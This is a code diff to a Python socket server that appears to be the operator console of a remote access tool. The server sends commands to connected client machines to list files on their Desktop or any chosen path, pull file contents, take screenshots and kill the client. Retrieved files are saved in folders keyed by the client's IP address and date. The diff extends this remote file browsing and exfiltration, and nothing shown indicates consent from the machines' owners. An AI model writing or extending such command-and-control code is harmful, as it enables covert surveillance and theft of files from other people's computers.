@@ -49,11 +49,29 @@ def command_handler_loop(server_socket):
         try:
             command_line = input("Server > ")
             args = args_parse(command_line.split())
-
             if args.show:
-                show_files()
+                print("Choose a directory:")
+                print("1. Desktop")
+                print("2. Input directory")
+                print("3. Cancel")
+                choice = input("Choice > ")
+
+                if choice == '1':
+                    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+                    print("Desktop files:")
+                    show_files(desktop_path)
+                elif choice == '2':
+                    input_path = input("Input directory > ")
+                    print("Input directory files:")
+                    show_files(input_path)
+                elif choice == '3':
+                    continue
+                else:
+                    print("Invalid choice")
+                    continue
             elif args.readfile:
-                read_file(args.readfile[0])
+                filename = ' '.join(args.readfile)
+                read_file(filename)
             elif args.kill:
                 kill_client()
             elif args.screenshot:
@@ -74,7 +92,7 @@ def command_handler_loop(server_socket):
 
 
 # Function to show the files received from the client
-def show_files():
+def show_files(path):
     global last_client_socket
     if last_client_socket is None:
         print("No client connected to show files.")
@@ -82,7 +100,8 @@ def show_files():
 
     try:
         command = {
-            'command': 'SHOW'
+            'command': 'SHOW',
+            'path': path
         }
         last_client_socket.send(json.dumps(command).encode())
         print("Requested file list from client.")
@@ -200,7 +219,7 @@ def handle_client(client_socket, client_address):
 
                 elif data_command == 'READ':
                     global READ_FILE_DIR
-                    filename = client_info['filename']
+                    filename = client_info['filename'].split('\\')[-1]
                     file_content = client_info['file_content']
                     dir_name = READ_FILE_DIR.format(ip=ip, date=date)
                     file_content_bytes = base64.b64decode(file_content)
@@ -214,7 +233,9 @@ def handle_client(client_socket, client_address):
 
                 elif data_command == 'SHOW':
                     files = client_info['files']
-                    print(f"Files from client: {files}")
+                    print("\nFiles:")
+                    for file in files:
+                        print(f"{file['name']} ({file['type']})")
 
                 elif data_command == 'SCREENSHOT':
                     global SCREENSHOT_DIR
